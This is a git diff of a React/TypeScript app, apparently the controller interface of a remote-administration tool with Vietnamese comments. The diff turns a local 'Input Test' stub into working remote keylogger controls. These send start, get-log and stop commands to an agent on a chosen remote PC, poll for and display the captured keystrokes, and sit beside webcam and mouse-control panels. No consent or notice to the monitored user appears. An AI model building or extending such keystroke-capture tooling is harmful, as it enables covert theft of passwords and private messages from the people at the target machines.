@@ -37,7 +37,10 @@ function App() {
   const [keyloggerOpen, setKeyloggerOpen] = useState(false);
   const [keyloggerRunning, setKeyloggerRunning] = useState(false);
   const [keyloggerContent, setKeyloggerContent] = useState('');
-  const keyloggerBusy = false;
+  const [keyloggerBusy, setKeyloggerBusy] = useState(false);
+  const [keyloggerLastLength, setKeyloggerLastLength] = useState(0);
+  /** Khi true: không cập nhật lại nội dung từ poll (sau Clear view); Refresh dùng force để bỏ cờ và tải lại. */
+  const [keyloggerViewCleared, setKeyloggerViewCleared] = useState(false);
   const [webcamOpen, setWebcamOpen] = useState(false);
   const webcamBusy = false;
   const [mouseControlOpen, setMouseControlOpen] = useState(false);
@@ -97,9 +100,37 @@ function App() {
 
   const resolvePc = useCallback((pc: RemotePc) => pcs.find((p) => p.id === pc.id) ?? pc, [pcs]);
 
-  const refreshKeyloggerLog = useCallback(async () => {
-        // Input Test chạy cục bộ, không cần gọi agent.
-    }, []);
+  const refreshKeyloggerLog = useCallback(
+    async (options?: { force?: boolean }) => {
+      if (!selectedPc) return;
+      if (keyloggerViewCleared && !options?.force) return;
+
+      try {
+        const result = await window.remoteApi.runCommand(selectedPc.id, 'KEYLOGGER_GET_LOG');
+        const parsed = JSON.parse(result.raw) as {
+          ok?: boolean;
+          output?: string;
+          running?: boolean;
+          message?: string;
+        };
+        if (typeof parsed.output === 'string') {
+          setKeyloggerContent(parsed.output);
+        }
+        if (typeof parsed.running === 'boolean') {
+          setKeyloggerRunning(parsed.running);
+        }
+        if (parsed.ok === false && parsed.message) {
+          appendLog(`KEYLOGGER_GET_LOG: ${parsed.message}`);
+        }
+        if (options?.force) {
+          setKeyloggerViewCleared(false);
+        }
+      } catch {
+        appendLog('KEYLOGGER_GET_LOG: không đọc được phản hồi agent');
+      }
+    },
+    [selectedPc, appendLog, keyloggerViewCleared],
+  );
 
   useEffect(() => {
     if (!keyloggerOpen) return;
@@ -230,20 +261,59 @@ function App() {
       appendLog('No PC selected.');
       return;
     }
+    setKeyloggerViewCleared(false);
     setKeyloggerOpen(true);
-    await refreshKeyloggerLog();
+    await refreshKeyloggerLog({ force: true });
   };
 
-    const handleStartKeylogger = async () => {
+  const handleStartKeylogger = async () => {
+    if (!selectedPc) return;
+    setKeyloggerBusy(true);
+    try {
+      const result = await window.remoteApi.runCommand(selectedPc.id, 'KEYLOGGER_START');
+      const parsed = JSON.parse(result.raw) as { ok?: boolean; message?: string };
+      if (parsed.ok) {
         setKeyloggerRunning(true);
         setKeyloggerContent('');
-        appendLog('Input Test started.');
-    };
+        setKeyloggerViewCleared(false);
+        appendLog(`KEYLOGGER_START: ${parsed.message ?? 'ok'}`);
+        await refreshKeyloggerLog({ force: true });
+      } else {
+        appendLog(`KEYLOGGER_START failed: ${parsed.message ?? result.message}`);
+      }
+    } catch {
+      appendLog('KEYLOGGER_START: lỗi phân tích phản hồi');
+    } finally {
+      setKeyloggerBusy(false);
+    }
+  };
 
-    const handleStopKeylogger = async () => {
+  const handleStopKeylogger = async () => {
+    if (!selectedPc) return;
+    setKeyloggerBusy(true);
+    try {
+      const result = await window.remoteApi.runCommand(selectedPc.id, 'KEYLOGGER_STOP');
+      const parsed = JSON.parse(result.raw) as {
+        ok?: boolean;
+        output?: string;
+        message?: string;
+      };
+      if (parsed.ok && typeof parsed.output === 'string') {
+        setKeyloggerContent(parsed.output);
         setKeyloggerRunning(false);
-        appendLog('Input Test stopped.');
-    };
+        setKeyloggerViewCleared(false);
+        appendLog(`KEYLOGGER_STOP: đã nhận log (${parsed.output.length} ký tự)`);
+      } else {
+        setKeyloggerRunning(false);
+        appendLog(`KEYLOGGER_STOP: ${parsed.message ?? result.message}`);
+      }
+    } catch {
+      appendLog('KEYLOGGER_STOP: lỗi phân tích phản hồi');
+      setKeyloggerRunning(false);
+    } finally {
+      setKeyloggerBusy(false);
+    }
+  };
 
   const refreshProcessModal = async (target: RemotePc): Promise<CommandResult> => {
     const t = resolvePc(target);
@@ -483,16 +553,32 @@ function App() {
           <KeyloggerModal
               busy={keyloggerBusy}
               content={keyloggerContent}
-              onClear={() => {
+              targetOs={selectedPc?.os ?? 'Windows'}
+              onClose={async () => {
+                  if (selectedPc && keyloggerRunning) {
+                      try {
+                          await window.remoteApi.runCommand(selectedPc.id, 'KEYLOGGER_STOP');
+                      } catch {
+                          // ignore
+                      }
+                  }
+
+                  setKeyloggerRunning(false);
                   setKeyloggerContent('');
-                  appendLog('Input Test cleared.');
+                  setKeyloggerLastLength(0);
+                  setKeyloggerViewCleared(false);
+                  setKeyloggerOpen(false);
               }}
-              onClose={() => setKeyloggerOpen(false)}
-              onRefresh={() => void refreshKeyloggerLog()}
+              onClearLog={() => {
+                  setKeyloggerViewCleared(true);
+                  setKeyloggerContent('');
+                  setKeyloggerLastLength(0);
+              }}
+              onResumeView={() => void refreshKeyloggerLog({ force: true })}
               onStart={() => void handleStartKeylogger()}
-              onStop={() => void handleStopKeylogger()}
               open={keyloggerOpen}
               running={keyloggerRunning}
+              viewCleared={keyloggerViewCleared}
               targetLabel={
                   selectedPc ? `${selectedPc.name} (${selectedPc.host}:${selectedPc.port})` : 'No target'
               }
@@ -502,6 +588,7 @@ function App() {
               busy={webcamBusy}
               onClose={() => setWebcamOpen(false)}
               open={webcamOpen}
+              pcId={selectedPc?.id ?? null}
               targetLabel={
                   selectedPc ? `${selectedPc.name} (${selectedPc.host}:${selectedPc.port})` : 'No target'
               }
